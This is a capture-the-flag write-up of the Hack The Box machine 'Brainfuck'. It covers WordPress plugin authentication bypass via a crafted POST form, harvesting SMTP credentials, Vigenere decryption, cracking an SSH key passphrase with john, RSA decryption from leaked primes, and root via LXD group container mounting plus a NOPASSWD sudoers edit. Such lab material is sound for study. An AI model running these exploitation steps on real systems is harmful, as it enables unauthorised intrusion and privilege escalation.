---
title: "Brainfuck - WriteUp"
date: Wed Dec 25 2024 14:30:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, lxd, ssh, wordpress, exploit, bash, burp, wfuzz]
image: /assets/img/htb-writeups/Pasted-image-20240202124848.png
---

{% include machine-info.html
  machine="Brainfuck"
  os="Linux"
  difficulty="Insane"
  platform="HTB"
%}

![Brainfuck](/assets/img/htb-writeups/Pasted-image-20240202124848.png)

---

---
----

![BRAINFUCK](/assets/img/htb-writeups/Pasted-image-20240202124848.png)

-----

## Recon

### nmap

`nmap` finds five open TCP ports, SSH (22), SMTP (25), POP3 (110), IMAP (143), and HTTPS (443):

```
oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.17
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-12 00:35 UTC
Nmap scan report for 10.10.10.17
Host is up (0.091s latency).
Not shown: 65530 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
110/tcp open  pop3
143/tcp open  imap
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 13.58 seconds
oxdf@hacky$ nmap -p 22,25,110,143,443 -sCV 10.10.10.17
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-12 00:36 UTC
Nmap scan report for 10.10.10.17
Host is up (0.090s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) TOP RESP-CODES PIPELINING USER AUTH-RESP-CODE UIDL CAPA
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: AUTH=PLAINA0001 LOGIN-REFERRALS IDLE Pre-login more LITERAL+ post-login ENABLE have listed ID IMAP4rev1 capabilities OK SASL-IR
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.06 seconds
```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 16.04 xenial. The TLS certificate gives a bunch of information, so I’ll want to look more closely at that.

### TLS Certificate

I’ll visit `https://10.10.10.17` and look at the TLS certificate. There’s a common name of `brainfuck.htb`, as well as SANs of `www.brainfuck.htb` and `sup3rs3cr3t.brainfuck.htb`:

![image-20220511210428221](https://0xdfimages.gitlab.io/img/image-20220511210428221.png)

I’ll also add these to `/etc/hosts`:

```
10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
```

The email address `orestis@brainfuck.htb` shows up a couple times as well.

I’ll run a `wfuzz` to look for additional subdomains, but it comes up empty.

### brainfuck.htb - TCP 443

#### By IP

The site when visiting by IP just shows the NGINX start page:

![image-20220511205416314](https://0xdfimages.gitlab.io/img/image-20220511205416314.png)

#### brainfuck.htb

Visiting `www.brainfuck.htb` redirects to `brainfuck.htb`, which presents a relatively bare WordPress page:

[![image-20220516071751083](https://0xdfimages.gitlab.io/img/image-20220516071751083.png)](https://0xdfimages.gitlab.io/img/image-20220516071751083.png)

[_Click for full image_](https://0xdfimages.gitlab.io/img/image-20220516071751083.png)

There’s a couple useful bits:

- The subtitle clearly says this page is built on WordPress.
- The post was by the user admin.
- The post says that SMTP integration is ready, and gives the email orestis@brainfuck.htb (same as in the TLS certificate).

#### Tech Stack

The site says it’s built on WordPress, which I can confirm by visiting `/wp-admin` and seeing the WordPress logo over the login form:

![image-20220511210955982](https://0xdfimages.gitlab.io/img/image-20220511210955982.png)

#### wpscan

Rather than brute force directories, I’ll start with `wpscan`. Given that this box is over five years old, it’s going to fund a _ton_ of stuff. I’m going to ignore all the stuff in WordPress core, and focus on the installed plugin:

```
oxdf@hacky$ wpscan --url https://brainfuck.htb --disable-tls-checks --api-token $WPSCAN_API
...[snip]...
[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
...[snip]...
 | Version: 7.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 ...[snip]...
```

It’s running WP Support Plus Ticket System 7.1.3. `wpscan` finds 6 vulnerabilities in this plugin. When Brainfuck was released, the current version of this plugin was 8.0.7, so I’ll ignore the two that claim to be RCE for version less than 8.0.8.

There’s some authenticated SQL injection as well, which I could keep in mind in case I find creds. The most interesting remaining is this:

```
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 - Privilege Escalation
 |     Fixed in: 8.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f
 |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
 |      - https://packetstormsecurity.com/files/140413/
```

I’ll look at that in a bit.

### sup3rs3cr3t.brainfuck.htb - TCP 443

This subdomain leads to “Super Secret Forum”:

![image-20220512083029905](https://0xdfimages.gitlab.io/img/image-20220512083029905.png)

At this point, I can only see one thread, and it doesn’t have anything interesting:

![image-20220512083101749](https://0xdfimages.gitlab.io/img/image-20220512083101749.png)

When I try to create an account, it says:

![image-20220512083134318](https://0xdfimages.gitlab.io/img/image-20220512083134318.png)

Even without access to that, I do seem to be logged in, but nothing new or interesting is present.

## Shell as orestis

### Auth as admin

The “Privilege Escalation” called out by WPScan has [this link](https://packetstormsecurity.com/files/140413/) which says:

> You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

The proof of concept is a page that will help generate the correct POST request, which I’ll update to have the correct host:

```
<form method="post" action="http://brainfuck.htb/wp-admin/admin-ajax.php">
  Username: <input type="text" name="username" value="administrator">
  <input type="hidden" name="email" value="sth">
  <input type="hidden" name="action" value="loginGuestFacebook">
  <input type="submit" value="Login">
</form>
```

Opening that shows a simple form asking what name I would like to auth as. I’ll enter admin (the author of the post):

![image](https://0xdfimages.gitlab.io/img/image-20220512075119269.png)

The HTML page is just a quick was to help generate this POST request:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: brainfuck.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Connection: close

username=admin&email=sth&action=loginGuestFacebook
```

I’ll submit that, and it eventually loads an empty page. But looking in Burp shows it is setting cookies. On refreshing the main page, now I’m logged in:

![image-20220516072000984](https://0xdfimages.gitlab.io/img/image-20220516072000984.png)

### RCE Failures

#### Edit Theme

Typically with admin access to WordPress, there are a few ways to get execution. One is by going to Appearance > Editor and trying to edit a theme:

[![image-20220516072326286](https://0xdfimages.gitlab.io/img/image-20220516072326286.png)_Click for full size image_](https://0xdfimages.gitlab.io/img/image-20220516072326286.png)

The reason I look at themes is that they contain PHP, unlike a POST which is just text/formatting. In this case, the editor is reporting that the files are not editable. It is very common in CTFs, and becoming more common in the real world, to make the theme PHP files not editable by the user that runs the webserver, as otherwise that is basically execution.

#### Plugin Upload

Following the menu through “Plugins” > “Add Plugin” takes me to this form:

[![image-20220516072511392](https://0xdfimages.gitlab.io/img/image-20220516072511392.png)_Click for full size image_](https://0xdfimages.gitlab.io/img/image-20220516072511392.png)

It’s complaining a bit about errors, but that could be the lack of internet on the HTB labs. The “Upload Plugin” button leads to another form with similar errors:

[![image-20220516072534309](https://0xdfimages.gitlab.io/img/image-20220516072534309.png)_Click for full size image_](https://0xdfimages.gitlab.io/img/image-20220516072534309.png)

I showed in [Spectra](https://0xdf.gitlab.io/2021/06/26/htb-spectra.html#new-plugin) how to generate a plugin that was a simple webshell. I’ll grab the same ZIP file I used in Spectra and upload it, but there’s an error:

![image-20220512080428649](https://0xdfimages.gitlab.io/img/image-20220512080428649.png)

#### Plugin Edit

I can also try the “Editor” link under the “Plugins” menu. For example, it can load `akismet.php`:

[![image-20220516072638003](https://0xdfimages.gitlab.io/img/image-20220516072638003.png)_Click for full size image_](https://0xdfimages.gitlab.io/img/image-20220516072638003.png)

Unfortunately, it has the same text at the bottom. It seems the admin has made the entire WordPress directory structure not writable by the web user.

### Access orestis’ Email

#### Credentials

Going back to the Plugins page, there are four plugins listed:

![image-20220512080915471](https://0xdfimages.gitlab.io/img/image-20220512080915471.png)

The blog posts were talking about SMTP integration. I’ll check out the “Settings” link:

![image-20220512081433613](https://0xdfimages.gitlab.io/img/image-20220512081433613.png)

It’s set up to use the SMTP server on Brainfuck, and it seems to have credentials saved. If I right-click on that field and select inspect, I can see that it is a `input` tag of `type` “password”, which obscures the characters:

![image-20220512081617512](https://0xdfimages.gitlab.io/img/image-20220512081617512.png)

But I can also see the value, “kHGuERB29DNiNE”.

#### Mailbox

The Ubuntu VM I’m using already has Evolution installed, so I’ll open that, and it pops a welcome wizard:

![image-20220512081854889](https://0xdfimages.gitlab.io/img/image-20220512081854889.png)

Working through the wizard, it hangs trying to recognize my identity, but I’ll click the skip button and get to “Receiving Email”:

![image-20220512082108580](https://0xdfimages.gitlab.io/img/image-20220512082108580.png)

I’ll change all the defaults that support encryption to a plain connection on 143 using password auth. I don’t think I need to send mail, but I’ll set it up the same, using unencrypted SMTP on 25:

![image-20220512082211001](https://0xdfimages.gitlab.io/img/image-20220512082211001.png)

Clicking “Finish” pops an auth request, and I’ll put in the password. I’ve got access to the mailbox.

[![image-20220516072723015](https://0xdfimages.gitlab.io/img/image-20220516072723015.png)_Click for full size image_](https://0xdfimages.gitlab.io/img/image-20220516072723015.png)

The first email is from wordpress about the new site. Nothing interesting.

The second has credentials for the “secret forum”:

![image-20220512082606491](https://0xdfimages.gitlab.io/img/image-20220512082606491.png)

### SSH Access

#### Enumerate Forum

With these creds, I’ll log into the forum as orestis, and there are two new threads available:

![image-20220512083502432](https://0xdfimages.gitlab.io/img/image-20220512083502432.png)

The first one, “SSH Access” shows a conversation between admin and orestis:

![image-20220512083555083](https://0xdfimages.gitlab.io/img/image-20220512083555083.png)

I’ll note that orestis seems to have a signature block that applies to all their posts, “Orestis - Hacking for fun and profit”.

The second thread is written in non-standard language, like the encrypted thread admin referred to:

![image-20220512084212154](https://0xdfimages.gitlab.io/img/image-20220512084212154.png)

I’ll note that each of orestis’ posts ends with the same structure, 7 letter word, dash, 7 letter word, three 3 letter words, and a 6 letter word, even if the letters are scrambled.

#### Find Decryption Key

I’ll take one of the encrypted signatures and the plaintext signature, and drop into Python:

```
oxdf@hacky$ python
Python 3.8.10 (default, Mar 15 2022, 12:22:08) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> enc = "Pieagnm - Jkoijeg nbw zwx mle grwsnn"
>>> pt = "Orestis - Hacking for fun and profit"
>>> assert len(enc) == len(pt)
```

`zip` will take one character from each string and pair it together:

```
>>> list(zip(enc, pt))
[('P', 'O'), ('i', 'r'), ('e', 'e'), ('a', 's'), ('g', 't'), ('n', 'i'), ('m', 's'), (' ', ' '), ('-', '-'), (' ', ' '), ('J', 'H'), ('k', 'a'), ('o', 'c'), ('i', 'k'), ('j', 'i'), ('e', 'n'), ('g', 'g'), (' ', ' '), ('n', 'f'), ('b', 'o'), ('w', 'r'), (' ', ' '), ('z', 'f'), ('w', 'u'), ('x', 'n'), (' ', ' '), ('m', 'a'), ('l', 'n'), ('e', 'd'), (' ', ' '), ('g', 'p'), ('r', 'r'), ('w', 'o'), ('s', 'f'), ('n', 'i'), ('n', 't')]
```

I’ll use that to start playing with ways to combine them. With a bit of experimentation, I can find a key

```
>>> [ord(e)-ord(p) for e,p in zip(enc, pt)]
[1, -9, 0, -18, -13, 5, -6, 0, 0, 0, 2, 10, 12, -2, 1, -9, 0, 0, 8, -13, 5, 0, 20, 2, 10, 0, 12, -2, 1, 0, -9, 0, 8, 13, 5, -6]
>>> [(ord(e)-ord(p))%26 for e,p in zip(enc, pt)]
[1, 17, 0, 8, 13, 5, 20, 0, 0, 0, 2, 10, 12, 24, 1, 17, 0, 0, 8, 13, 5, 0, 20, 2, 10, 0, 12, 24, 1, 0, 17, 0, 8, 13, 5, 20]
>>> [(ord(e)-ord(p))%26 + ord('a') for e,p in zip(enc, pt)]
[98, 114, 97, 105, 110, 102, 117, 97, 97, 97, 99, 107, 109, 121, 98, 114, 97, 97, 105, 110, 102, 97, 117, 99, 107, 97, 109, 121, 98, 97, 114, 97, 105, 110, 102, 117]
>>> [chr((ord(e)-ord(p))%26 + ord('a')) for e,p in zip(enc, pt)]
['b', 'r', 'a', 'i', 'n', 'f', 'u', 'a', 'a', 'a', 'c', 'k', 'm', 'y', 'b', 'r', 'a', 'a', 'i', 'n', 'f', 'a', 'u', 'c', 'k', 'a', 'm', 'y', 'b', 'a', 'r', 'a', 'i', 'n', 'f', 'u']
```

The key is something like “fuckmybrain” or “mybrainfuck” or maybe “brainfuckmy”.

#### Decrypt

I’ll jump over to the [Vigenere Cipher page](https://www.dcode.fr/vigenere-cipher) on decode.fr and decode the message:

![image-20220512085932293](https://0xdfimages.gitlab.io/img/image-20220512085932293.png)

The rest of the messages decode to:

> **orestis**: Hey give me the url for my key bitch :)
> 
> **admin**: Say please and i just might do so…
> 
> **orestis**: Pleeeease….
> 
> **admin**: There you go you stupid fuck, I hope you remember your key password because I dont :)
> 
> `https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa`
> 
> **orestis**: No problem, I’ll brute force it ;)

#### Decrypt SSH Key

`curl` will grab the key:

```
oxdf@hacky$ curl https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -k
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
...[snip]...
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----
```

I’ll use `ssh2john.py` to generate a hash from the key, and then crack it with `john`:

```
oxdf@hacky$ ssh2john.py brainfuck-orestis > brainfuck-orestis.hash
oxdf@hacky$ john brainfuck-orestis.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
3poulakia!       (brainfuck-orestis)     
1g 0:00:00:02 DONE (2022-05-12 13:37) 0.4366g/s 5441Kp/s 5441Kc/s 5441KC/s 3pran54..3porfirio
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

With that key I’ll save a copy with no password using `openssl`:

```
oxdf@hacky$ openssl rsa -in brainfuck-orestis -out ~/keys/brainfuck-orestis 
Enter pass phrase for brainfuck-orestis:
writing RSA key
```

#### SSH

With that key I can connect:

```
oxdf@hacky$ ssh -i ~/keys/brainfuck-orestis orestis@10.10.10.17
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)
...[snip]...
orestis@brainfuck:~$
```

And grab the first flag:

```
orestis@brainfuck:~$ cat user.txt
2c11cfbc************************
```

## root.txt

### Enumeration

There’s a few other files in orestis’ home directory:

```
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
```

`mail` is an empty directory. The two `.txt` files have long numbers, and `output.txt` labels its as “Encrypted Password”:

```
orestis@brainfuck:~$ cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
orestis@brainfuck:~$ cat output.txt 
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

`encrypt.sage` is a script.

### Break RSA

#### encrypt.sage

[SageMath](https://en.wikipedia.org/wiki/SageMath) is an open-source mathematical programming language build on top of Python, which means the syntax will be very familiar to anyone who knows Python.

This script is relatively straight forward:

```
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)

c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

It reads `root.txt` into a variable named `password`, and then converts that text into a single large integer. It then generates some additional integers, `p`, `q`, `n`, `phi`, and `e`. These are the integers used in [RSA Encryption](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Key_generation).

It calculates `c` using the message, `e`, and `n`, which is RSA’s encryption mechanism. Then it writes the encrypted result to `output.txt`, and `p`, `q`, and `e` to `debug.txt`.

#### Decrypt

[This paragraph](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Key_generation) from the Wikipedia RSA page pinpoints what I’ll exploit:

> The _public key_ consists of the modulus _n_ and the public (or encryption) exponent _e_. The _private key_ consists of the private (or decryption) exponent _d_, which must be kept secret. _p_, _q_, and _λ_(_n_) must also be kept secret because they can be used to calculate _d_. In fact, they can all be discarded after _d_ has been computed.[[16]](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#cite_note-16)

For RSA to be secure, `p` and `q` must be kept secret. With access to `p`, `q`, and `e`, calculating `d` (the decryption key) is trivial.

[This StackExchange post](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e) includes a Python script to do it. I’ll update the constants to match what’s on Brainfuck:

```
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```

Now running that prints the plaintext (kind of):

```
oxdf@hacky$ python decrypt_rsa.py 
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
```

#### Convert to ASCII

The script provided the plaintext as a large integer. I’ll use a Python terminal to convert that back to ASCII:

```
oxdf@hacky$ python
Python 3.8.10 (default, Mar 15 2022, 12:22:08) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
>>> f"{pt:x}"
'3665666331613564626238393034373531636536353636613330356262386566'
>>> bytes.fromhex(f"{pt:x}").decode()
'6efc1a5d************************'
```

First I convert the integer to hex using an f-string, and then I’ll convert that to bytes and decode to get ASCII.

Unfortunately, there’s no way to get a shell from this path.

## Shell as root [Alternative]

### Enumeration

orestis is part of the `lxd` group:

```
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

Being in the `lxd` group means that I can interact with `lxc`, the Linux container runtime. There are no containers running:

```
orestis@brainfuck:~$ lxc list
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
```

There are also no images available:

```
orestis@brainfuck:~$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
```

### LXC Exploitation

#### Strategy

I’ve shown this exploit several times before, but not since November 2020 with [Tabby](https://0xdf.gitlab.io/2020/11/07/htb-tabby.html#lxc-exploitation). The idea here is the same strategy used with various virtualization exploits. I’ll create a new container and mount the entire host operating system into that container somewhere. Then I’ll get a shell on that container as root, and have full access to the host file system.

To create a container, I’ll have to generate an image, load it onto Brainfuck, and then spawn a container from it. Most examples of this exploit will use the Alpine container, as it’s the smallest common container, and therefore easiest to upload. Because I don’t need a full image, but rather, just enough to get a shell with the mounted host filesystem, my favorite way to exploit this is from [this post](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1) by M0noc, which creates a 656 byte string that can be used to make a barebones busybox image.

#### Load Image

Working out of `/dev/shm`, I’ll “upload” the image by copying the `echo` command from the post:

```
orestis@brainfuck:/dev/shm$ echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
```

I’ll import that image:

```
orestis@brainfuck:/dev/shm$ lxc image import bob.tar.bz2 --alias bobImage
Image imported with fingerprint: 8961bb8704bc3fd43269c88f8103cab4fccd55325dd45f98e3ec7c75e501051d
```

`lxc` now shows it:

```
orestis@brainfuck:/dev/shm$ lxc image list
+----------+--------------+--------+-------------+--------+--------+-------------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC | DESCRIPTION |  ARCH  |  SIZE  |          UPLOAD DATE          |
+----------+--------------+--------+-------------+--------+--------+-------------------------------+
| bobImage | 8961bb8704bc | no     |             | x86_64 | 0.00MB | May 16, 2022 at 10:19am (UTC) |
+----------+--------------+--------+-------------+--------+--------+-------------------------------+
```

#### Create and Start VM

To create the VM, I’ll run `lxc init` and then I’ll add the root of the host filesystem at `/r`:

```
orestis@brainfuck:/dev/shm$ lxc init bobImage bobVM -c security.privileged=true
Creating bobVM
orestis@brainfuck:/dev/shm$ lxc config device add bobVM realRoot disk source=/ path=r
Device realRoot added to bobVM
```

I’ll start the container, and now it shows up in `lxc list`:

```
orestis@brainfuck:/dev/shm$ lxc start bobVM
orestis@brainfuck:/dev/shm$ lxc list
+-------+---------+------+------+------------+-----------+
| NAME  |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+-------+---------+------+------+------------+-----------+
| bobVM | RUNNING |      |      | PERSISTENT | 0         |
+-------+---------+------+------+------------+-----------+
```

#### Shell in Container

`lxc exec` will allow me to get a shell in the container:

```
orestis@brainfuck:/dev/shm$ lxc exec bobVM -- /bin/bash
bash-4.3#
```

I’ll find `root.txt` in `/r/root`:

```
bash-4.3# cd /r/root/
bash-4.3# cat root.txt
6efc1a5d************************
```

### Shell

There are many ways to go from this full filesystem access to a shell. I’ll show my failure on SSH, and my success on `sudo`.

#### SSH [Fail]

My first thought is to add a SSH key to `/r/root/.ssh/authorized_keys`. The directory doesn’t exist, but I can create it:

```
bash-4.3# cd /r/root
bash-4.3# mkdir .ssh
bash-4.3# cd .ssh/
bash-4.3# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > authorized_keys
```

The permissions on `authorized_keys` must be 600:

```
bash-4.3# chmod 600 authorized_keys
```

However, trying to connect still fails:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.10.17
root@10.10.10.17: Permission denied (publickey).
```

That’s because SSH is configured to not allow root logins at all:

```
bash-4.3# cat /r/etc/ssh/sshd_config | grep -i root
PermitRootLogin no
# the setting of "PermitRootLogin without-password".
```

I can edit that, but it won’t take effect until the service restarts, and I have no way to do that. I could try to reboot the box, but orestis doesn’t have permissions:

```
orestis@brainfuck:/dev/shm$ shutdown -r now
Failed to set wall message, ignoring: Interactive authentication required.
Failed to reboot system via logind: Interactive authentication required.
Failed to start reboot.target: Interactive authentication required.
See system logs and 'systemctl status reboot.target' for details.
Failed to open /dev/initctl: Permission denied
Failed to talk to init daemon.
```

#### sudoers

The `/etc/sudoers` file defines who can run `sudo` and how. I’ll add orestis, allowing the user to run any command as root:

```
bash-4.3# echo "orestis ALL=(ALL) NOPASSWD: ALL" >> /r/etc/sudoers
```

Now, I’ll exit from the container, and orestis can run any command as root:

```
orestis@brainfuck:/dev/shm$ sudo -l
Matching Defaults entries for orestis on brainfuck:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User orestis may run the following commands on brainfuck:
    (ALL) NOPASSWD: ALL
```

`su` gives a root shell:

```
orestis@brainfuck:/dev/shm$ sudo su -
root@brainfuck:~#
```

I’ll make sure to clean up this addition so that other players can’t immediately get root.
---

**Última actualización**: 2024-12-25<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
